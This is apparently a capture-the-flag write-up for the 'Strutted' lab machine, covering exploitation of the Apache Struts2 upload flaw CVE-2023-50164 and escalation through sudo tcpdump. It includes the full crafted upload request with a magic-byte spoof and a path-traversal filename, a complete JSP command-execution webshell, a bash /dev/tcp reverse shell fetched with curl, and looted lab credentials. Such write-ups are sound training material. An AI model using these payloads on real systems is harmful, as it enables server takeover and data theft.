# **Strutted**

## 🧠 Info

- **Target** Linux
- **IP** 10.10.11.59
- **Author** -- 
- **Difficulty** Medium
- **Tags** #Vuln #RCE #Upload #Bypass #WebShell #Java #Apache #struts2 #CVE #GTFObins #ReverseShell 

---

## 🔍 **Recon**

### Nmap
```bash
sudo nmap -Pn -F --disable-arp-ping -n --min-rate 1000 --stats-every=5s 10.10.11.59
```

```bash
sudo nmap -Pn -A -sV --version-all -p 22,80 $tip
```

### Whatweb
```bash
whatweb http://strutted.htb/ -a 3
```

---
## ⚙️ **Enumeration**
- **Ports**
	- 22
	- 80
- **Services**
	- 22 ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
	- 80 http
		- Apache Tomcat/9.0.58 (Ubuntu) 
		- behind nginx 1.18.0 (Ubuntu) 
- **Users**
	- tomcat
	- james
- **Web pages**
	- http://strutted.htb/

---

## 🛠️ Exploitation
- **Vulnerability**
- ### Exploit steps:
- #### Bypassing Upload Filters & Installing a WebShell
	- - http://strutted.htb Led Us To A Page With an Image Upload Functionality
	- They Provide you To Install their Docker image to how they are confitured
		- ![[Install-Thier-Docker-image.png]]
		- We Have installed *strutted.zip* which is provided through http://strutted.htb/download.action
		- After we unzipped The file, We have Some interesting Files
		- We Discovered That *Apache struts2 is behind nginx* For Upload Functionality
		- 
	- We Tried To Upload Anything As a Test
	- ![[First-Upload-Test.png]]
	- As You Can See it Only accepts Those types
	- We Try to Bypass it & upload a *JAVA WebShell* 
	-  So Know, We *Create a shell.jsp file* Which Contains the Webshell
	- & We Try To install it
		- Bypass Upload Filters
		- Change the Magic Numbers Of The file using `hexedit shell.jsp`command 
		- Replace the first numbers for `FF D8 FF` To become a *Jpeg image*
		- After Attempting To Install it, it still gives blocks it 
		- ![[Upload-second-attempt.png]]
		- Now we Try to Tamper With the *Content-Type* To make it look like an image , **Also Didnt Work !! 
	- After Some Research Using Dorking : `"struts java" "exploit"`
	- **We Found**
	- >  CVE-2023-50164 
	- [Read More Here ABout it](https://www.praetorian.com/blog/cve-2023-50164-apache-struts-file-upload-vulnerability/)
	- **Steps Fo CVE-2023-50164**
		- Original Upload Request
```text
POST /upload.action HTTP/1.1
Host: strutted.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------168685593410961542904191063630
Content-Length: 1070
Origin: http://strutted.htb
Connection: keep-alive
Referer: http://strutted.htb/
Cookie: JSESSIONID=258604BEEBB3F67CC77E020EDFB06FC8
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------168685593410961542904191063630
Content-Disposition: form-data; name="upload"; filename="shell.jsp"
Content-Type: application/octet-stream

ÿØÿthingForMagicNumberSpace

<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT

<JSP Payload> --snip-- --snip-- ---snip--- <JSP Payload>

                disr = dis.readLine(); 
                }
        }
%>
-----------------------------168685593410961542904191063630--


```
-  Modified Request
	- we first change the name of our webshell
	-  `mv shell.jsp shell.jpeg`
```text
POST /upload.action HTTP/1.1
Host: strutted.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------168685593410961542904191063630
Content-Length: 1215
Origin: http://strutted.htb
Connection: keep-alive
Referer: http://strutted.htb/
Cookie: JSESSIONID=258604BEEBB3F67CC77E020EDFB06FC8
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------168685593410961542904191063630
Content-Disposition: form-data; name="Upload"; filename="shell.jpeg"
Content-Type: image/jpeg

ÿØÿthingForMagicNumberSpace

<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT

<JSP Payload> --snip-- --snip-- ---snip--- <JSP Payload>

                disr = dis.readLine(); 
                }
        }
%>

-----------------------------168685593410961542904191063630
Content-Disposition: form-data; name="top.UploadFileName";

../../shell.jsp
-----------------------------168685593410961542904191063630--

```
- AFter Installing The *WebShell* , We can notice that it succeeded & its is installed & Can Be Executed in Through visiting http://strutted.htb/shell.jsp
- Here We Can Run Some Commands But we Want to **Reverse Connect** To Our Local Machine
#### Reverse Shell
```bash
### On Our lOcal Machine
touch shell.sh
echo "bash -c 'exec bash -i &>/dev/tcp/10.10.16.2/1234 <&1'" > shell.sh
python3 -m http.server 8080
nc -nlvp 1234
# & configure MSPRO To Listen for  meterpreter Shell

### On Webshell
curl http://our-ip:our-port/shell.sh -o /tmp/shell.sh 
chmod +x /tmp/shell.sh
/tmp/shell.sh
```

- Payloads:
- **Java WebShell**
```java
AnythingForMagicNumberSpace


<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
```


---
## 🧪 Post Exploitation
- **Whoami**
	- tomcat 
- Network info:
- **Users**
	- tomcat
	- james
- Passwords:
- ### Privilege escalation:
	- Now That We Got  A Reverse Shell We Can Start looking For james password 
	
```bash
	cd conf 
	grep -irl pass .  
	grep pass ./tomcat-users.xml ## Here We Find username="admin" password="IT14d6SSP81k"
```

- Now We Try **Ssh** To James using This password & is Succeeds
- After We SSh to james we do `sudo -l `& We Found That We can use `tcpdump` with sudo 
- Go To [[GTFOBins]] To use the `tcpdump` command to priv esc.

## 🏁 Flags
- User: 64953a4bf4cf52578733e14f9ffe8e85
- Root: 21948ecf89c70d8c5a4f886cbba8e503

---

## 📦 Loot
- Passwords:
	- admin:skqKY6360z!Y
	- admin:IT14d6SSP81k
- Hashes:
- Interesting files:

---

## 📘 Notes & Tips

- when Installing The Webshell in The *Modified Request Section* , You can notice that we added the Following Lines: 
```text
-----------------------------168685593410961542904191063630
Content-Disposition: form-data; name="top.UploadFileName";

../../shell.jsp
```
- We Included the **Path Traversal Sequence** `../../shell.jsp` because The Server Install the Shell in a **Non Executable Environment** , so we installed it in The Root path